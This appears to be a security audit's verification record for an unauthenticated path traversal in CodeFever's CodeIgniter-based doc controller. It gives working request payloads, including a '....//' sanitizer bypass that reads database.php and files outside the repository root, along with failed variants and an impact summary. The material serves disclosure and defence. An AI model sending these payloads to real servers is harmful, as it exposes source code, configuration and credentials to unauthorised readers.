@@ -1,0 +1,72 @@
+CODEFEVER-01 — Unauthenticated arbitrary file read via Doc controller URI path traversal
+========================================================================================
+Target    : PGYER/codefever (CodeIgniter 2.1.1, CI_VERSION in system/core/CodeIgniter.php)
+Endpoint  : GET /doc/cn/<traversal>  ->  application/controllers/doc.php::_detail()
+Harness   : real application served unmodified by `php -S 127.0.0.1:8098 -t www router.php`
+            Only stub: yaml_parse_file() shim (portable PHP 7.4 lacks pecl-yaml) +
+            env.yaml/config.yaml created from shipped templates. CI core, routing,
+            controllers, views, DB connection all genuine. MySQL 8.0 reached via
+            application/config/database.php (credentials REDACTED).
+Auth      : none. All requests sent with NO cookies (response Set-Cookie is issued BY
+            the app during the request; Base::__construct never enforces login).
+
+--- request log (curl --path-as-is, host 127.0.0.1:8098) ---------------------------
+
+[baseline] GET /doc/cn/
+  -> HTTP 302 Location: /doc/cn/<first-doc-page> (normal auto-expand behavior),
+     response body 19204 bytes, renders doc view with menu (24 .menu nodes),
+     <title>Codefever community - Doc</title>. App fully functional, unauthenticated.
+
+[T1] GET /doc/cn/../../../etc/passwd                       (audit original PoC)
+  -> HTTP 302 Location: /doc/cn/../../../etc/passwd/
+     Redirect issued by doc.php::__construct (no trailing slash, no .ext suffix):
+     request never reaches the file read. Following the redirect:
+[T1b] GET /doc/cn/../../../etc/passwd/
+  -> HTTP 302 Location: /doc/cn/
+     CI 2.1.1 URI.php:222 `str_replace(array('//','../'), '/', trim($uri,'/'))`
+     collapses literal ../ segments before uri_string is set -> $docFile resolves
+     to <root>/doc/zh-cn/etc/passwd (nonexistent) -> _detail redirects.
+     CONCLUSION: the original audit payload does NOT fire on this stack.
+
+[T2] GET /doc/cn/....//....//application/config/database.php   (BYPASS PoC, verified)
+  -> HTTP 200 OK, Content-type: text/html
+     Why it works: str_replace() applies patterns sequentially; '....//' first has
+     '//' collapsed to '/' forming '...../', then the '../' pass rewrites '...../'
+     into '../' — CI itself reconstructs '../' AFTER its sanitizer has run.
+     Result: uri_string = doc/cn/../../application/config/database.php,
+     $docFile = <root>/doc/zh-cn/../../application/config/database.php
+              = <root>/application/config/database.php  (OUTSIDE www/ docroot).
+     Response body embeds the RAW text of database.php inside the app's doc view
+     wrapper (div.doc-content present), e.g.:
+       "...['password'] The password used to connect to the database
+        |  ['database'] The name of the database you want to connect to
+        |  ['dbdriver'] The database type. ie: mysql. ..."
+     (grep hits for dbdriver/hostname/permitted_uri_chars in body: 4)
+
+[T4] GET /doc/cn/....//....//....//....//....//....//<marker-file>
+     (6 dot-segment hops, escapes the repo root entirely; target = a benign marker file placed outside the repository root for the test)
+  -> HTTP 200 OK, body 28690 bytes; body contains the marker heading of the target
+     file (marker filename and heading <REDACTED> found; content not quoted here).
+     Confirms arbitrary-depth traversal to any same-drive path readable by the
+     PHP process, not just sibling directories.
+
+[T3] GET /doc/cn/..%2f..%2fapplication%2fconfig%2fdatabase.php
+  -> HTTP 302 Location: /doc/cn/  (NOT exploitable on this stack: CI 2.1.1 never
+     rawurldecodes URI segments and CI 2.1.1 URI.php:222 does not strip '%2f',
+     so the encoded form reaches file_exists() as literal '..%2f..' and fails).
+     The audit PoC's encoded variant is therefore dead here; the '....//'
+     normalization-confusion form is the working vector.
+
+[assets branch] application/controllers/doc.php:118-133 (_assets) shares the same
+  unsanitized $docFile (finfo + fopen + echo) reachable when the basename matches
+  /^\w{32}\.png$/; same root cause, not separately exercised.
+
+--- impact ------------------------------------------------------------------------
+Unauthenticated attacker reads arbitrary files on the web server's drive (source
+code, configuration, secrets readable by the PHP user). On the shipped Linux/Docker
+deployment, /etc/passwd and application sources are readable; secrets in env.yaml
+(DB credentials) sit exactly at the traversed location.
+
+--- redactions --------------------------------------------------------------------
+Local DB password used in the verify env is REDACTED from all artifacts; the read
+database.php content contains only YAML_MYSQL_* constant NAMES, no secret values.
